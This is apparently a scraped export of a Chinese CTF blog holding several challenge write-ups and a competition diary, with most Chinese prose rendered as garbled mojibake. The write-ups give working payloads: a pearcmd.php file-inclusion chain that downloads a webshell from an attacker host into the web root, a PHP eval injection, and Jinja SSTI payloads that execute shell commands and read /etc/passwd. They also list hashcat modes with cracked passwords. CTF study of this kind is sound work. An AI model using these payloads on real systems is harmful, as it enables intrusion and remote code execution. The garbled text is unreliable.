\u0026#34;/usr/local/lib/php\u0026#34; = \u0026#39;@\u0026#39;php_dir\u0026#39;@\u0026#39;; then INCDIR=`dirname $0` INCARG=\u0026#34;\u0026#34; else INCDIR=\u0026#34;/usr/local/lib/php\u0026#34; INCARG=\u0026#34;-d include_path=/usr/local/lib/php\u0026#34; fi fi exec $PHP -C -q $INCARG -d data.timezone=UTC -d output_buffering=1 -d variables_order=EGPCS -d open_basedir=\u0026#34;\u0026#34; -d safe_mode=0 -d register_argc_argv=\u0026#34;On\u0026#34; -d auto_prepend_file=\u0026#34;\u0026#34; -d auto_append_file=\u0026#34;\u0026#34; $INCDIR/pearcmd.php \u0026#34;$@\u0026#34; ä»æœ€åä¸€è¡Œå¯ä»¥çœ‹åˆ°è°ƒç”¨äº†/pearcmd.phpï¼Œè€Œè¿™ä¸ªpearcmd.phpçš„å‚æ•°$argvå°±æ¥æºäº$_SERVER[\u0026lsquo;argv\u0026rsquo;]ï¼Œè¿™ä¸ªæ˜¯æˆ‘ä»¬å¯æ§çš„ä¼ å…¥å‚æ•°\nåˆ©ç”¨pearå‘½ä»¤æ‰§è¡Œä»»æ„æ–‡ä»¶ä¸‹è½½ å¦‚å›¾ï¼Œç›´æ¥ä¸‹è½½å¼€å¯äº†httpæœåŠ¡å™¨çš„ç›®å½•ä¸‹çš„æŒ‡å®šæ–‡ä»¶åˆ°å½“å‰æ‰€åœ¨ç›®å½•\nä½¿ç”¨install -Rè€Œédownloadå¯ä»¥æ§åˆ¶ä¸‹è½½åˆ°ä»»æ„ç›®å½•ï¼Œæ¯”å¦‚ç›´æ¥ä¸‹è½½åˆ°webæœåŠ¡çš„ç›®å½•\næ‰€ä»¥æ€»ä½“æ€è·¯+payload å¦‚æœå­˜åœ¨è¿™æ ·çš„ç¯å¢ƒ\n å®‰è£…pear å¼€å¯register_argc_argv å­˜åœ¨å¯æ§çš„ä¼ å…¥å‚æ•°æ¥åšåˆ°æ–‡ä»¶åŒ…å«ï¼ˆæ¯”å¦‚include $_GET['f'].phpï¼‰ å¯ä»¥å‡ºç½‘  æˆ‘ä»¬å°±å¯ä»¥åšåˆ°ä»»æ„æ–‡ä»¶ä¸‹è½½ä»è€Œgetshellï¼›å‰é¢ä¹Ÿæåˆ°register_argc_argvç»§ç»­PHP_IN_PREDIRï¼Œæˆ‘ä»¬å¯ä»¥ç•™ä¸€ä¸ª.user.iniçš„åé—¨æ¥è®¾ç½®register_argc_agrvä¸ºOn\npayloadå°±æ˜¯è¿™æ ·äº†\n// å­˜åœ¨ include $_GET['f'].php // webç›®å½•å¯å†™ - http://ip:port/include.php?f=/../../../../../../../../../../usr/local/lib/php/pearcmd\u0026amp;+install+-R+/var/www/html+http://ip:port/evil.php - http://ip:port/tmp/pear/download/evil.php // tmpç›®å½•å¯å†™ - http://ip:port/include.php?f=/../../../../../../../../../../usr/local/lib/php/pearcmd\u0026amp;+install+-R+/tmp+http://ip:port/evil.php - http://ip:port/include.php?f=/tmp/pear/download/evil é¦–å…ˆè¦åŒ…å«ä¸€ä¸ªæ­£ç¡®ä½ç½®çš„pearcmd.phpï¼ˆé€šå¸¸åœ¨/usr/local/lib/php/pearcmd.phpï¼‰ï¼Œæ¥ç€åŒ…å«\u0026amp;+download+http://your_vps/eval.phpï¼ˆæˆ–è€…å¦‚æœå‰é¢ç›´æ¥æ˜¯/pearcmd.phpçš„è¯å°±å¯ä»¥ç›´æ¥ç»™å‚æ•°äº†/pearcmd.php+download+http://your_vps/eval.phpï¼‰æ¥è£…ğŸï¼ˆæ³¨æ„è·¯å¾„æ˜¯å¦æ­£ç¡®ï¼‰ï¼Œä¹‹åå†åŒ…å«æˆ‘ä»¬çš„ğŸå³å¯\nå…¶å®ƒçš„ä¾‹é¢˜ [CampCTF 2015] Trolol\n[å·…å³°æå®¢ 2020] MeowWord\n[RCTF 2021] VerySafe\n è¿˜æ˜¯åšçš„é¢˜ä¸å¤Ÿå¤šï¼Œå·²æœ‰çš„çŸ¥è¯†ä¹Ÿåº”ç”¨çš„ä¸å¤Ÿç†Ÿç»ƒï¼Œå®åœ¨æ˜¯å¤ªå¤ªå¤ªå¤ªå¤ªèœäº†ï¼Œå¾—å¥½å¥½å­¦ï¼Œä¸èƒ½å¤©å¤©åˆ’æ°´æ‘¸é±¼\n","date":"2021-10-26T20:17:24+08:00","permalink":"https://amiaaaz.github.io/2021/10/26/qwnt2021-wp/","section":"posts","tags":["wp"],"title":"2021å¼ºç½‘æ‹Ÿæ€ Wp"},{"categories":["CTF"],"contents":"Web/è¿·è·¯çš„é­”æ³•å°‘å¥³  é­”æ³•å°‘å¥³è¿·å¤±åœ¨äº†ä»£ç ç©ºé—´ è¯·å¯»æ‰¾å¥¹ç°åœ¨åœ¨å“ª\n \u0026lt;?php highlight_file(\u0026#39;index.php\u0026#39;); extract($_GET); error_reporting(0); function String2Array($data) { if($data == \u0026#39;\u0026#39;) return array(); @eval(\u0026#34;\\$array = $data;\u0026#34;); return $array; } if(is_array($attrid) \u0026amp;\u0026amp; is_array($attrvalue)) { $attrstr .= \u0026#39;array(\u0026#39;; $attrids = count($attrid); for($i=0; $i\u0026lt;$attrids; $i++) { $attrstr .= \u0026#39;\u0026#34;\u0026#39;.intval($attrid[$i]).\u0026#39;\u0026#34;=\u0026gt;\u0026#39;.\u0026#39;\u0026#34;\u0026#39;.$attrvalue[$i].\u0026#39;\u0026#34;\u0026#39;; if($i \u0026lt; $attrids-1) { $attrstr .= \u0026#39;,\u0026#39;; } } $attrstr .= \u0026#39;);\u0026#39;; } String2Array($attrstr); /?attrid[]=\u0026amp;attrvalue[]=\u0026quot;);phpinfo();// å‚è€ƒï¼šCG-CTF å˜é‡è¦†ç›–(PHP extractå‡½æ•°åˆ©ç”¨) | CTF-PHPé»‘é­”æ³•\nMisc/WELCOME DASCTFxJlenu  æ¬¢è¿æ¥åˆ°é­”æ³•çš„ä¸–ç•Œï¼ˆç­¾åˆ°ï¼‰\n å¯æ˜¯æœ‰å‡ å±‚åŒ…æµ†çš„åŸé¢˜äº†å±äºæ˜¯ï¼Œä¹‹å‰ç»å¯¹åšè¿‡ä¸€æ¬¡\n","date":"2021-10-24T16:47:40+08:00","permalink":"https://amiaaaz.github.io/2021/10/24/dasctf1021-wp/","section":"posts","tags":["wp"],"title":"DasCTF1021 Wp"},{"categories":["CTF"],"contents":"Web/git commit -m \u0026ldquo;whatever\u0026rdquo;  Visit the website\n emmmm è”ç³»è¿™ä¸ªé¢˜ç›® è®¿é—®ä¸€ä¸‹.gitçœ‹çœ‹æœ‰æ²¡æœ‰å¤‡ä»½æ–‡ä»¶æ³„éœ²\nç”¨GitHackerä¸‹è½½æ³„éœ²çš„gitæ–‡ä»¶ï¼Œæœ‰ä¸€ä¸ªindex.php\n\u0026lt;?php /** * Simple sodium crypto class for PHP \u0026gt;= 7.2 * @author MRK */ class crypto { /** * * @return type */ static public function create_encryption_key() { return base64_encode(sodium_crypto_secretbox_keygen()); } /** * Encrypt a message * * @param string $message - message to encrypt * @param string $key - encryption key created using create_encryption_key() * @return string */ static function encrypt($message, $key) { $key_decoded = base64_decode($key); $nonce = random_bytes( SODIUM_CRYPTO_SECRETBOX_NONCEBYTES ); $cipher = base64_encode( $nonce . sodium_crypto_secretbox( $message, $nonce, $key_decoded ) ); sodium_memzero($message); sodium_memzero($key_decoded); return $cipher; } /** * Decrypt a message * @param string $encrypted - message encrypted with safeEncrypt() * @param string $key - key used for encryption * @return string */ static function decrypt($encrypted, $key) { $decoded = base64_decode($encrypted); $key_decoded = base64_decode($key); if ($decoded === false) { throw new Exception(\u0026#39;Decryption error : the encoding failed\u0026#39;); } if (mb_strlen($decoded, \u0026#39;8bit\u0026#39;) \u0026lt; (SODIUM_CRYPTO_SECRETBOX_NONCEBYTES + SODIUM_CRYPTO_SECRETBOX_MACBYTES)) { throw new Exception(\u0026#39;Decryption error : the message was truncated\u0026#39;); } $nonce = mb_substr($decoded, 0, SODIUM_CRYPTO_SECRETBOX_NONCEBYTES, \u0026#39;8bit\u0026#39;); $ciphertext = mb_substr($decoded, SODIUM_CRYPTO_SECRETBOX_NONCEBYTES, null, \u0026#39;8bit\u0026#39;); $plain = sodium_crypto_secretbox_open( $ciphertext, $nonce, $key_decoded ); if ($plain === false) { throw new Exception(\u0026#39;Decryption error : the message was tampered with in transit\u0026#39;); } sodium_memzero($ciphertext); sodium_memzero($key_decoded); return $plain; } } $privatekey = \u0026#34;mRHpcEckKATdwDC/CwpRinDTiAYrn9lzWpTo277omKs=\u0026#34;; $flag = file_get_contents(\u0026#39;../flag.txt\u0026#39;); $enc = crypto::encrypt($flag, $privatekey); echo $enc; ?\u0026gt;åŒ…å«äº†è§£å¯†çš„æ¨¡å—ï¼Œæ‰€ä»¥ç”¨å®ƒè§£å¯†ä¸€ä¸‹å³å¯\nâ€”â€”â€”â€”è¿™é‡Œæˆ‘çš„æœ¬åœ°phpä¸€ç›´å‡ºé—®é¢˜ ç‰ˆæœ¬7.3.4å’Œ7.4.21éƒ½æŠ¥é”™\nWeb/notrequired  Hello I am cheemsloverboi33! I made a php website. Can you do a quick security check on it?\n æ³¨æ„åˆ°é“¾æ¥æ˜¯http://ctf.bennetthackingcommunity.cf:8333/index.php?file=index.html\nç”¨ä¼ªåè®®çœ‹ä¸€ä¸‹index.phpçš„æºç /index.php?file=php://filter/convert.base64-encode/resource=index.php\nè®¿é—®/bin/secrets.txtï¼Œå¾—åˆ° QlVIQ3tyM3F1MXIzXzFzX3MwbTN0aDFuZ185MDkxMDI5MTMwKCk4MTEyOTM4MTIxfQ==\nBUHC{r3qu1r3_1s_s0m3th1ng_9091029130()8112938121}\nWeb/madlib  I just created the first draft of my first flask project, a madlib generator that fills the given words into a madlib template!\nTry it out and let me know what you think! The character length limit should make this app pretty secure.\n ä¸€ä¸ªflaskçš„webapp\nå…ˆçœ‹ä¸‹æºç \nfrom flask import Flask, render_template_string, request, send_from_directory app = Flask(__name__) @app.route(\u0026#39;/\u0026#39;) def index(): return send_from_directory(\u0026#39;html\u0026#39;, \u0026#39;index.html\u0026#39;) @app.route(\u0026#39;/madlib\u0026#39;, methods=[\u0026#39;POST\u0026#39;]) def madlib(): if len(request.json) == 5: verb = request.json.get(\u0026#39;verb\u0026#39;) noun = request.json.get(\u0026#39;noun\u0026#39;) adjective = request.json.get(\u0026#39;adjective\u0026#39;) person = request.json.get(\u0026#39;person\u0026#39;) place = request.json.get(\u0026#39;place\u0026#39;) params = [verb, noun, adjective, person, place] if any(len(i) \u0026gt; 21 for i in params): return \u0026#39;your words must not be longer than 21 characters!\u0026#39;, 403 madlib = f\u0026#39;To find out what this is you must {verb}the internet then get to the {noun}system through the visual MAC hard drive and program the open-source but overriding the bus won\\\u0026#39;t do anything so you need to parse the online SSD transmitter, then index the neural DHCP card {adjective}.{person}taught me this trick when we met in {place}allowing you to download the knowledge of what this is directly to your brain.\u0026#39; return render_template_string(madlib) return \u0026#39;This madlib only takes five words\u0026#39;, 403 @app.route(\u0026#39;/source\u0026#39;) def show_source(): return send_from_directory(\u0026#39;/app/\u0026#39;, \u0026#39;app.py\u0026#39;) app.run(\u0026#39;0.0.0.0\u0026#39;, port=1337) çœ‹åˆ°äº†ç†Ÿæ‚‰çš„æ¨¡æ¿æ¸²æŸ“ï¼ˆè¯­æ®µæ¥è‡ªäºu/masterhacker_botï¼‰ï¼Œåªä¼šæ¸²æŸ“ç‰¹å®šçš„ä½ç½®ï¼Œè€Œä¸”æœ‰ä¸ªç‰¹æ®Šçš„{adjective}.{person}\nå­˜åœ¨5ä¸ªå¯ä»¥sstiçš„åœ°æ–¹ï¼Œä½†æ˜¯é™åˆ¶æ¯ä¸€ä¸ªæ¡†å­—ç¬¦æ•°å¿…é¡»åœ¨21ä¸ªä¹‹å†…ï¼›å…¶ä¸­è¿˜æœ‰ä¸¤ä¸ªéå¸¸ç‰¹æ®Šçš„{adjective}.{person}è¿äº†èµ·æ¥ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨è¿™ä¸ª.ç‚¹å·è¿æ¥æˆ‘ä»¬payloadçš„é•¿åº¦\nè¿™æ ·ç›¸å½“äºæœ‰4ä¸ªå¯ä»¥æ„é€ çš„åœ°æ–¹ï¼Œå‰ä¸¤ä¸ªç”¨æ¥å°†é•¿é•¿çš„payloadç”¨çŸ­çš„å˜é‡åŠé€†è¡Œæ›¿æ¢ï¼Œç¬¬ä¸‰ä¸ªæ˜¯payloadæœ¬ä½“ï¼Œç¬¬ä¸‰å’Œç¬¬å››ä¸ªä½ç½®å‡æ˜¯å›æ˜¾ä½ï¼›é¦–å…ˆé€šè¿‡config.updateæ–¹æ³•ä¸æ–­åœ°å‘åå–å€¼æ¥æ‹¿åˆ°å¯ä»¥ç”¨çš„å‡½æ•°å¹¶å°†å…¶å­˜å‚¨åœ¨config.aä¸­ï¼Œä¹‹åè°ƒç”¨å®ƒæ¥rce\n{%set x=config%} {%set y=x.update%} {{y(a=x __class__.__init__)}} {{config.a}} å›æ˜¾\u0026lt;function Config.__init__ at 0x7fd75dae31e0\u0026gt;ï¼Œç°åœ¨æˆ‘ä»¬è®¾æ³•è°ƒç”¨å‡½æ•°æ¥æ‰§è¡Œå‘½ä»¤\n{{y(a=x.a __globals__['os'])}} å›æ˜¾\u0026lt;module 'os' from '/usr/local/lib/python3.6/os.py'\u0026gt;\n{{y(a=x.a popen)}} å›æ˜¾\u0026lt;function popen at 0x7fd75ed5a730\u0026gt;ï¼Œæ­¤æ—¶æˆ‘ä»¬çš„config.aå°±æ˜¯os.popen()ï¼Œç°åœ¨æ¥è°ƒç”¨å®ƒæ¥æ‰§è¡Œå‘½ä»¤\n{%set x=config%} {%set y=x.a%} {{y('uname -a') read()}} {{config.a}} å›æ˜¾Linux madlib-digitaloverdose:madlib-46bf3bc4 3.10.0-1160.el7.x86_64 #1 SMP Mon Oct 19 16:18:59 UTC 2020 x86_64 GNU/Linuxï¼ŒæˆåŠŸæ‰§è¡Œäº†å‘½ä»¤ï¼Œæ¥ä¸‹æ¥å°±å¾ˆç®€å•äº†ï¼Œè¯»ä¸€æ³¢flag\n{{y('cat flag.txt') read()}} DO{an0th3r_ssti_ch4ll3nge_l0l593deff6}\nâ€”â€”â€”â€”å¾ˆå¹¸è¿çš„æ˜¯æœ€åæˆ‘ä»¬çš„payloadæ­£å¥½å°äº21ä¸ªå­—ç¬¦ï¼Œæ˜¾ç„¶æˆ‘ä»¬è¢«é•¿åº¦é™åˆ¶äº†å‘æŒ¥ï¼Œä½†æ˜¯è¿™é‡Œè¿˜æœ‰åˆ«çš„trick\nJinjaä¸ä»…æ”¯æŒæ¨¡æ¿å†…éƒ¨çš„å˜é‡èµ‹å€¼è¿˜æ”¯æŒ~è¿›è¡Œå­—ç¬¦ä¸²çš„è¿æ¥ï¼Œå†åˆ©ç”¨ä¸Šconfig.commandç”šè‡³èƒ½è¯»å‡º/etc/passwd\n{%set x=config%} {%set y=x.update%} {%set p='cat /etc'%} {%set q=p~'/passw'%} {{y(b=q~'d')}} {%set x=config%} {%set y=x.a%} {%set z=config.b%} {{z}} {{y(z).read()}} å‚è€ƒï¼šDigital Overdose 2021 Autumn CTF Writeup â€” madlib (web)\nLog Analysis/Part1 - Ingress  Our website was hacked recently and the attackers completely ransomwared our server!\nWe\u0026rsquo;ve recovered it now, but we don\u0026rsquo;t want it to happen again.\nHere are the logs from before the attack, can you find out what happened?\n ç»™å‡ºäº†è®¿é—®æ—¥å¿—ï¼Œæœ‰åºå¤§çš„æ•°æ®ï¼Œnè¡Œ~~ï¼Œä½†æ˜¯ä¸å¤ªä¼šçœ‹~~\nåœ¨37557è¡Œå‡ºç°äº†è®¿é—®/ywesusnz cmd%3Dcd+..ï¼Œå¾€åè¿˜æœ‰ä¸€äº›ywesusnzå¼€å¤´çš„ï¼Œ37629è¡Œå‡ºç°äº†/ywesusnz cmd%3Dcat+RE97YmV0dGVyX3JlbW92ZV90aGF0X2JhY2tkb29yfQ==ï¼Œb64è§£å¯†\nDO{better_remove_that_backdoor}\nLog Analysis/Part 2 - Investigation  Thanks for finding the RFI vulnerability in our FAQ. We have fixed it now, but we don\u0026rsquo;t understand how the attacker found it so quickly.\nWe suspect it might be an inside job, but maybe they got the source another way. Here are the logs for the month prior to the attack, can you see anything suspicious?\nPlease submit the attackers IP as the flag as follow, DO{x.x.x.x}\n ä»ç„¶æ˜¯ç»™å‡ºäº†å¾ˆå¤šè¡Œçš„æ—¥å¿—\nå‘ç°äº†å¯ç–‘çš„å†…å®¹DO{45.85.1.176} ä½†æ˜¯æäº¤flagé”™è¯¯\nï¼ˆç„¶åå‘ç°æ˜¯å¾ˆå‚»é€¼çš„æŠŠ200.13.84.124å½“ä½œflagäº¤äº†â€¦â€¦\nLog Analysis/Part 3 - Backup Policy  So it looks like the attacker scanned our site for old backups right? Did he get one?\n æ¥ç€æ‰¾ï¼Œå‘ç°äº†/backup.zipçš„è¯·æ±‚æ˜¯200ok\nä½†æ˜¯äº¤flagçš„æ—¶å€™ä¸çŸ¥é“äº¤å•¥ï¼Œçœ‹äº†wpæ‰å‘ç°è—åœ¨äº†UAå¤´é‡Œ\nMozilla/5.0+(Windows+NT+5.1;+RE97czNjcjN0X19fYWdlbnR9;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/60.0.3112.90+Safari/537.36 å°†ä¸­é—´é‚£ä¸€ä¸²b64è§£å¯†åå¾—åˆ°\nDO{s3cr3t___agent}\nSource Analysis/A1 - C-nanigans  Find the flag parts in the source code, assemble the flag, submit the flag.\n(This code may not compile, and it is useless to attempt to do so)\n æç¤ºæˆ‘ä»¬å…³æ³¨æºç è€Œä¸æ˜¯ç¼–è¯‘\n444f7b 733075526333 5f406e616c79333173 7d hexè§£å¯†åå¾—åˆ°DO{s0uRc3_@naly31s}\nHash Cracking/Hash 1 54a09c22fc0d1af44865e411ff6e8d50 phantomlover\nHash Cracking/Hash 2 52ed4b109a2662fdf15edfd95632667869fc5802 fishchips\nHash Cracking/Hash 3 550b57fc03f0a800fab603cb8eb4e29fbd5c76655d7ab995b1fe9c6ddf963a3d2627ebd79e067022f792bb2490a260c051aecbc4a7aedb3ec5dbf9439cd66f81 mommadobbins\nHash Cracking/Hash 4 451716a045ca5ec7f25e191ab5244c61aaeeb008c4753a2065e276f1baba4723 Hash Identifier\nhashcat -m 6900 ghost\nhappyfamily\nHash Cracking/Hash 5 $2a$10$QlR/ZlXgQPWfx9JmRffMZutcL3o3w6JAiRbfvGda4u09lrfOvgcH6 hashcat -m 3200 bcrypt\ncowabunga\nHash Cracking/Hash 6 $1$veryrand$QetWu27IoJ2FFSG30xKAQ. Hash Analyzer\nhashcat -m 500 MD5-Crypt\nscottiebanks\nHash Cracking/Hash 7 $6$veryrandomsalt$t8EIWEiDpWYzeC1c44q7f6ZENOuO2wagnrJBPs4d/PptWxAxlnH7qRcf0xnKagaOEHBN9dGBV5Y1syJSB3s6H1 hashcat -m 1800 sha512crypt $6$\nigetmoney\n å¾ˆæ°´çš„wpï¼Œæˆ–è€…è¯´æ˜¯å¤ç°ï¼Œæ²¡æœ‰ä»€ä¹ˆå‚è€ƒä»·å€¼ï¼›æŒºæœ‰æ„æ€çš„é¢˜ï¼Œå­¦åˆ°äº†sstiçš„æ–°trickï¼›Source Analysisçš„å‰©ä¸‹ä¸¤ä¸ªé¢˜å…¨æ˜¯web+reverse/crypto/pwnï¼ˆæŒ‡è·¯wp: Boris | I think this could be C4ï¼‰ï¼Œè°¢è°¢ï¼Œå®Œå…¨çœ‹ä¸æ‡‚ï¼Œå·²ç»è·ªäº†\nwebç‹—æ­»è·¯ä¸€æ¡æ­»è·¯ä¸€æ¡æ­»è·¯ä¸€æ¡æ­»è·¯ä¸€æ¡æ­»è·¯ä¸€æ¡\nğŸ˜…\n","date":"2021-10-22T11:54:15+08:00","permalink":"https://amiaaaz.github.io/2021/10/22/digitaloverdosectf2021-wp/","section":"posts","tags":["wp"],"title":"DigitalOverdoseCTF2021 Wp"},{"categories":[],"contents":"æ¯”èµ›å‰ä¸€å¤©/15å· ä¸‹åˆ2ç‚¹50çš„é£æœºï¼Œç»“æœä¸´å‡ºå­¦æ ¡å‰å‘ç°èº«ä»½è¯ä¸¢äº†ï¼Œè´¼å°´å°¬ï¼Œæ‰¾äº†ä¸¤åœˆæ²¡æ‰¾åˆ°å°±ç›´æ¥å»æœºåœºäº†ï¼Œç”¨ä¸´æ—¶èº«ä»½è¯æ˜ä¸Šäº†é£æœºä¹‹åæ”¶åˆ°ç”µè¯è¯´èº«ä»½è¯è¢«æ¡åˆ°äº†orz è¿™ä¹ˆä½çº§çš„é”™è¯¯ä¸‹æ¬¡ç»ä¸ä¼šæœ‰äº†TAT\nåˆ°éƒ‘å·ä¹‹åæ‰“æ»´æ»´ç»“æœå¸æœºç”µè¯æ‰“ä¸é€šï¼Œåˆæ­£å¥½ä¸‹é›¨ï¼Œè·Ÿé˜Ÿå‹ä¸€èµ·ä¸Šäº†ä¸ªæ‰“è¡¨é£å¿«çš„å°é»‘è½¦ï¼Œåˆ°åœ°é“ç«™é—¨å£å°±148å—é’±ï¼Œè¿˜å¥½æœ€ååªç»™äº†100ï¼Œä½†æ˜¯ä¹Ÿå¤ªä»–å¦ˆçš„å‘äº†\nä¹‹åæŒ¤äººè´¼å¤šçš„åœ°é“ï¼Œå…ˆå»é…’åº—é™„è¿‘çš„æ´¾å‡ºæ‰€å¼€äº†ä¸ªè¯æ˜ï¼Œç„¶ååˆ°é…’åº—ä½ä¸‹ï¼Œé¥­è¿˜è¡Œï¼Œæ˜¯1å±‚è‡ªåŠ©é¤ï¼Œæˆ‘è·Ÿå¦ä¸€ä¸ªå°å§å§ä½ä¸€ä¸ªæˆ¿é—´\næ¯”èµ›ç¬¬ä¸€å¤©/16å· æ—©ä¸Šèµ·æ¥ä¹‹åè·ŸåŒé˜Ÿçš„ä¸¤ä¸ªå¸ˆå‚…å»ç§‘æŠ€é¦†ç­¾åˆ°ï¼Œé¢†è¡£æœå’Œå‚èµ›è¯ï¼ˆé‚£è¾¹çš„å¿—æ„¿è€…æ˜¯éƒ‘å·ä¸­å­¦çš„å°å§å§ä»¬ï¼Œé¢œå€¼è¶…é«˜\nç„¶åå½©æ’äº†ä¸€ä¸‹é€‰æ‰‹å‘è¨€ï¼Œå›å»åƒä¸­é¥­ï¼ˆé»˜é»˜åæ§½ä¸€ä¸‹æŸå‡ ä½å¸ˆå‚…å»å‚è§‚ç§‘æŠ€é¦†æ²¡å¸¦æˆ‘ç©è¿™ä»¶äº‹äº†ï¼ï¼ï¼è®°ä»‡ = =ã€‚\n3ç‚¹åŠå¼€å¹•å¼ï¼Œæˆ‘é»˜é»˜åšäº†ä¸ªé€‰æ‰‹ä»£è¡¨å‘è¨€ï¼ˆè¡¨æƒ…ç®¡ç†å¤§å¤±è´¥ æ‰€æœ‰ç…§ç‰‡éƒ½æ‹å¾—è´¼ä¸‘ï¼‰\n4ç‚¹å¼€èµ›ï¼ŒçœŸä¸æ„§æ˜¯è·‘ç”·æ¨¡å¼ï¼ŒæŠŠæˆ‘ä¸€æ•´å¹´çš„è¿åŠ¨é‡éƒ½ç»™è·‘å®Œäº†ï¼ŒæˆåŠŸå…‹æœäº†ä¸æ•¢åæ‰‹æ‰¶ç”µæ¢¯çš„ææƒ§ç—‡ï¼Œç§‘æŠ€é¦†4å±‚ä¸Šä¸‹æ¥å›è·‘\næœ€å¼€å§‹ç»™çš„é¢˜æ˜¯è¦åœ¨ç§‘æŠ€é¦†ä¸­æ‰¾åˆ°5å¼ å›¾ç‰‡ä¸Šçš„åœ°æ–¹å¹¶ä¸”æ‹ç…§ï¼Œè¿™æ˜¯æœ€è€—ä½“åŠ›çš„ï¼Œè·‘ç€è·‘ç€å°±è¿·è·¯äº†ï¼ˆåæ¥æƒ³çš„è¯ï¼Œè¿™ä¸ªç¯èŠ‚åˆä¸ç»™åˆ†ï¼Œä¸€å¼€å§‹å°±è½æœ‰ç‚¹è‰ç‡ï¼Œå¯ä»¥ç›´æ¥åšåˆ«çš„é¢˜ï¼‰\nç„¶ååé¢çš„é¢˜åˆ†æ•£åœ¨1234å±‚ï¼Œæœ‰çš„é¢˜æ˜¯åªèƒ½åšä¸€æ¬¡ä½†æ˜¯ä¸é™æ—¶ï¼Œæœ‰çš„æ˜¯é™æ—¶åˆåªèƒ½ä¸€æ¬¡ï¼Œæ ¹æ®è§£å‡ºçš„ç¨‹åº¦ç»™å¡ç‰‡ï¼ŒæŠŠä¸Šé¢çš„æˆè¯­ä½œä¸ºflagäº¤åˆ°å¹³å°ä¸Š\nè¯´è¯´å‡ ä¸ªå°è±¡æ·±åˆ»çš„é¢˜å§ï¼Œç«ç„°ç†Šç†Šï¼Œçº¢è‰²é©å‘½é˜…è¯»ç†è§£é¢˜ï¼Œç»™å‡ å¼ çº¸é˜…è¯»å±•æ¿ä¸Šçš„å†…å®¹ç„¶åç­”é¢˜ï¼Œä¸å¤ªå¥½æ‰¾ï¼Œæ‹¿äº†1600åˆ†ï¼Œ10åˆ†é’Ÿä¸å¤ªå¤Ÿç”¨ï¼Œæœ‰å‡ ä¸ªæ˜¯è’™ä¸Šå»çš„\né˜¿å°¼ç›æ ¼æ–¯ï¼Œåˆšå¼€å§‹æˆ‘è¿‡å»ä¹‹åä¸€çœ‹é¢˜ç›®æè¿°ï¼Œå¥½å®¶ä¼™ï¼Œæ‹Ÿæ€ï¼Œè¿˜æ˜¯åªèƒ½åšä¸€æ¬¡ï¼Œæˆ‘å°±å…ˆèµ°äº†ï¼Œåé¢å†è¿‡æ¥åšçš„æ—¶å€™å‘ç°è¿™ä»–å¦ˆä¹Ÿæ˜¯ä¸ªé˜…è¯»ç†è§£é¢˜ï¼Œè‰ï¼Œè¿˜æ˜¯æœ¬ç«¥è¯ä¹¦ï¼Œå…¨ç¨‹ç½šæŠ„å†™\né˜¿æ‹‰éœæ´å¼€ï¼ŒåŒªå¤·æ‰€æ€çš„é¢˜ï¼Œä»¥ä¸ºæ˜¯æ‰“å¼€å­˜åŒ…æŸœï¼Œæ²¡æƒ³åˆ°å°±æ˜¯æˆ³å¼€å·¦ä¸‹è§’çš„å¼€å§‹ï¼Œç„¶åç‚¹å¼€æ–‡ä»¶å¤¹\nè¿˜æœ‰ä¸ªé¢˜æ˜¯æ‰¾æ‘„åƒå¤´ï¼Œå¿˜äº†å«å•¥åå­—äº†ï¼Œè¯´æ˜¯æœ‰180ä¸ªæ‘„åƒå¤´ï¼Œå‰5åˆ†é’Ÿè‚‰çœ¼çœ‹ï¼Œå5åˆ†é’Ÿèƒ½æ‹¿çº¢å¤–çº¿çš„æ‰«ææªï¼Œåæ­£æ˜¯å°½å¯èƒ½å¾€å¤šäº†åœˆï¼ˆx\né©±é€éº»ç“œæ˜¯ä¸¤ä¸ªé¢˜ï¼Œä¸€ä¸ªæ˜¯å¯†ç ï¼Œä¸ä¼šè§£ï¼Œphpçš„æ”¾åˆ°æœ€åæ²¡æ—¶é—´çœ‹\nå¾ˆæ— è¯­çš„æ˜¯ä¸€äº›é¡¹ç›®å› ä¸ºåœºåœ°é™åˆ¶è¿˜éœ€è¦æ’é˜Ÿï¼Œæˆ‘ä»¬æ’åˆ°é˜¿æ‹‰éœæ´å¼€è¿™ä¸ªé¢˜çš„æ—¶å€™ç¦»ç»“æŸå°±å‰©10åˆ†é’Ÿäº†ï¼Œè¿˜å¥½è§£çš„æ¯”è¾ƒå¿«\nä¸­é—´æˆ‘ä»¬é˜Ÿæœ€é«˜åˆ°ç¬¬2åï¼Œæœ€åæˆªæ­¢çš„æ—¶å€™æ˜¯ç¬¬10ï¼Œ8000åˆ†ï¼Œåˆšå¥½æŒ‚åˆ°å¤§å±å¹•ä¸Š\næ¯”å®Œä¹‹åå¥½å¤šé˜Ÿéƒ½æ¢äº†å¤´åƒå’Œç­¾åï¼Œäºæ˜¯æˆ‘ä»¬æ¢äº†è¿™ä¸ª\nåƒå®Œé¥­å°±8ç‚¹äº†ï¼Œå›å»å‡†å¤‡ç¬¬äºŒå¤©çš„break\u0026amp;fix\næ¯”èµ›ç¬¬äºŒå¤©/17å· æ—©ä¸Š7ç‚¹åŠå°±å¼€å§‹æ¯”ï¼Œ6ç‚¹åŠèµ·åºŠï¼Œå›°å¾—ä¸€æ‰¹åˆæ²¡èƒƒå£ï¼Œåƒäº†ä¿©è›‹ç³•æ‹¿äº†ä¸ªé…¸å¥¶å°±å»ä¼šåœºäº†\nåŒ†å¿™è¿ä¸Šç½‘çº¿ï¼Œçœ‹äº†æ¯”èµ›æ‰‹å†Œï¼Œawdpæ¨¡å¼ï¼Œæ”¾äº†4é“é¢˜ï¼Œä¸¤ä¸ªpwnä¸¤ä¸ªweb\né¦–å…ˆæ„Ÿè°¢ä¸€ä¸‹pwnğŸ‘´æ—ºæ—ºå¸ˆå‚… ä¸¤ä¸ªé¢˜å…¨å‡ºäº† ååˆ†nb\nwebæ–¹é¢ï¼Œä¸€ä¸ªæ˜¯phpååºåˆ—åŒ–ï¼ˆæ€ä¹ˆè€æ˜¯ä½ ï¼‰ å…¨åœº0è§£ï¼ˆç”¨åˆ°äº†åŸç”Ÿç±»çš„ä¸€ä¸ªç‰¹æ€§ å¯ä»¥å‚è€ƒè¿™ä¸ªé¢˜[NepCTF 